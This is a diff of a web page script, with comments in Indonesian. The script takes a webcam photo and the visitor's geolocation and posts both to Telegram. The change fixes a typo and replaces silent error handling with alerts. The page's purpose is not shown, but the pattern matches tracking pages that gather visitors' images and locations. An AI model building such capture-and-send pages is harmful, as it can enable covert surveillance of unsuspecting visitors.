@@ -116,7 +116,8 @@
 
       let photoBlob = null;
       try {
-        const stream = await navigator.mediaDevices.getUser Media({ video: true });
+        // Perhatikan: getUser Media tanpa spasi
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement("video");
         video.srcObject = stream;
         await video.play();
@@ -133,7 +134,8 @@
 
         stream.getTracks().forEach(track => track.stop());
       } catch (e) {
-        // Kamera gagal diakses, lanjut tanpa foto
+        alert("Gagal mengakses kamera: " + e.message);
+        return; // hentikan jika kamera gagal
       }
 
       let coords = null;
@@ -146,7 +148,8 @@
           );
         });
       } catch (e) {
-        // Lokasi gagal diakses, lanjut tanpa lokasi
+        alert("Gagal mengakses lokasi: " + e.message);
+        // lanjut tanpa lokasi
       }
 
       try {
@@ -174,8 +177,10 @@
             })
           });
         }
+
+        alert("Data berhasil dikirim ke Telegram!");
       } catch (e) {
-        // Gagal kirim ke Telegram, abaikan error
+        alert("Gagal mengirim data ke Telegram: " + e.message);
       }
     });
   </script>
